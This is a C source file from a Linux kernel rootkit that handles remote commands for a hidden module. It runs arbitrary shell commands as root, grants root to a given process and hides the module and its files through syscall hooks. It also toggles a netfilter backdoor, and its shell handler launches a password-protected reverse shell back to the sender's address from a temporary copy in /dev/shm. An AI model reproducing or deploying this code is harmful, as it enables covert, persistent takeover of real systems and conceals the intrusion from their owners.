#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/umh.h>

#include "cdd.h"
#include "command.h"
#include "config.h"
#include "debugfs.h"
#include "evasion.h"
#include "exec.h"
#include "htm.h"
#include "netfilter.h"
#include "sudo.h"
#include "sys_getdents.h"


static notrace int _htm_su_handler(const char *args)
{
	long pid;

	if (kstrtol(args, 10, &pid)) {
		#ifdef HTM_DEBUG
		htm_pr_warn("failed to parse arguments: %s", args);
		#endif

		return -EINVAL;
	}

	return htm_sudo((pid_t)pid);
}

static notrace int _htm_shell_handler(__be32 *saddr)
{
	int ret, ret_debugfs;
	char cmd[HTM_MAX_STRING];

	char *dir_name = htm_debugfs_dir_name();
	char *rsh_name = htm_debugfs_rsh_name();

	memset(cmd, 0x00, sizeof(cmd));

	ret_debugfs = htm_debugfs_rsh_create();

	ret = snprintf(
		cmd, sizeof(cmd) - 1,
		"cp /sys/kernel/debug/%s/%s /dev/shm/;"
		"/dev/shm/%s -nfk " HTM_RSH_PASSWORD " -E " HTM_EXEC_SHELL " %pI4 %d;"
		"rm /dev/shm/%s",
		dir_name, rsh_name, rsh_name, saddr, HTM_RSH_PORT, rsh_name
	);

	if (ret <= 0) {
		#ifdef HTM_DEBUG
		htm_pr_err("failed to build command string - snprintf returned %u", ret);
		#endif

		return -ENOMEM;
	}

	// If `debugfs` wasn't enabled, disable it in user space to prevent a race condition due to
	// UMH_NO_WAIT
	if (! ret_debugfs) {
		snprintf(
			cmd + ret, (sizeof(cmd) - ret) - 1,
			";kill -%u %u", HTM_SIG_DISABLE_DEBUGFS, HTM_PID
		);
	}

	ret = htm_exec(cmd, UMH_NO_WAIT);

	return ret;
}

notrace bool is_htm_command_atomic(const char *cmd)
{
	return (
		! strcmp(HTM_CMD_DISABLE_DEBUGFS, cmd) ||
		! strcmp(HTM_CMD_ENABLE_DEBUGFS, cmd)  ||
		! strcmp(HTM_CMD_EXEC, cmd)            ||
		! strcmp(HTM_CMD_HIDE_MODULE, cmd)     ||
		! strcmp(HTM_CMD_RSH, cmd)             ||
		! strcmp(HTM_CMD_SHOW_MODULE, cmd)
	);
}

notrace bool is_htm_command(const char *cmd)
{
	return (
		! strcmp(HTM_CMD_DISABLE_CDD, cmd)     ||
		! strcmp(HTM_CMD_DISABLE_DEBUGFS, cmd) ||
		! strcmp(HTM_CMD_DISABLE_FS, cmd)      ||
		! strcmp(HTM_CMD_DISABLE_NF, cmd)      ||
		! strcmp(HTM_CMD_ENABLE_CDD, cmd)      ||
		! strcmp(HTM_CMD_ENABLE_DEBUGFS, cmd)  ||
		! strcmp(HTM_CMD_ENABLE_FS, cmd)       ||
		! strcmp(HTM_CMD_ENABLE_NF, cmd)       ||
		! strcmp(HTM_CMD_EXEC, cmd)            ||
		! strcmp(HTM_CMD_HIDE_MODULE, cmd)     ||
		! strcmp(HTM_CMD_RSH, cmd)             ||
		! strcmp(HTM_CMD_SHOW_MODULE, cmd)     ||
		! strcmp(HTM_CMD_SUDO, cmd)
	);
}

// Handle each command along with their arguments
notrace int htm_command(const char *cmd, __be32 *saddr)
{
	int ret;

	#ifdef HTM_DEBUG
	if (saddr)
		htm_pr_info("remote command received from %pI4: %s", saddr, cmd);
	#endif

	if (! cmd) {
		#ifdef HTM_DEBUG
		htm_pr_warn("empty command received");
		#endif

		return -EINVAL;
	}

	if (! strncmp(HTM_CMD_EXEC, cmd, sizeof(HTM_CMD_EXEC) - 1)) { // includes terminating 0x00
		if (cmd[strlen(cmd)] == ' ')
			return htm_exec(cmd + sizeof(HTM_CMD_EXEC), UMH_NO_WAIT);

		#ifdef HTM_DEBUG
		htm_pr_warn("empty command for htm-exec");
		#endif

		return -EINVAL;
	}

	if (! strcmp(HTM_CMD_DISABLE_CDD, cmd))
		return htm_cdd_destroy();

	if (! strcmp(HTM_CMD_DISABLE_DEBUGFS, cmd))
		return htm_debugfs_rsh_remove();

	if (! strcmp(HTM_CMD_DISABLE_FS, cmd)) {
		if ((ret = htm_hook_uninstall(&hook_sys_getdents)))
			return ret;

		if ((ret = htm_hook_uninstall(&hook_sys_getdents64))) {
			#ifdef HTM_DEBUG
			htm_pr_notice(
				"installing previously removed hook for symbol %s",
				hook_sys_getdents.name
			);
			#endif

			htm_hook_install(&hook_sys_getdents);
			return ret;
		}
	}

	if (! strcmp(HTM_CMD_HIDE_MODULE, cmd))
		return htm_hide_module();

	if (! strcmp(HTM_CMD_DISABLE_NF, cmd))
		return htm_netfilter_unregister();

	if (! strcmp(HTM_CMD_RSH, cmd))
		return _htm_shell_handler(saddr);

	if (! strcmp(HTM_CMD_ENABLE_CDD, cmd))
		return htm_cdd_create();

	if (! strcmp(HTM_CMD_ENABLE_DEBUGFS, cmd))
		return htm_debugfs_rsh_create();

	if (! strcmp(HTM_CMD_ENABLE_FS, cmd)) {
		if ((ret = htm_hook_install(&hook_sys_getdents)))
			return ret;

		if ((ret = htm_hook_install(&hook_sys_getdents64))) {
			#ifdef HTM_DEBUG
			htm_pr_notice(
				"removing previously installed hook for symbol %s",
				hook_sys_getdents.name
			);
			#endif

			htm_hook_uninstall(&hook_sys_getdents);
			return ret;
		}
	}

	if (! strcmp(HTM_CMD_SHOW_MODULE, cmd))
		return htm_show_module();

	if (! strcmp(HTM_CMD_ENABLE_NF, cmd))
		return htm_netfilter_register();

	if (! strncmp(HTM_CMD_SUDO, cmd, sizeof(HTM_CMD_SUDO) - 1)) { // includes terminating 0x00
		if (cmd[strlen(cmd)] == ' ')
			return _htm_su_handler(cmd + sizeof(HTM_CMD_SUDO));

		return htm_sudo(0);
	}

	#ifdef HTM_DEBUG
	htm_pr_warn("unknown command received: %s", cmd);
	#endif

	return -EINVAL;
}
